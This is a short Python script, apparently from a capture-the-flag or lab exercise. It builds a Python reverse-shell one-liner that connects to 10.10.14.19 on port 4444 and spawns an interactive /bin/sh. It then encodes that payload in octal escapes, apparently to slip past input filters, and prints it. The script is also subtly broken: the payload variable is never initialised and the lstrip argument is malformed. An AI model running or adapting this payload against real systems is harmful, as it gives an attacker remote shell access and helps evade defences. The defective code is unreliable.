#!/usr/bin/python3

command = f"python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.19\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'"

# encode payload in octal
for char in command:
	payload += f"\\{oct(ord(char)).lstrip({0o})}"

print(payload)
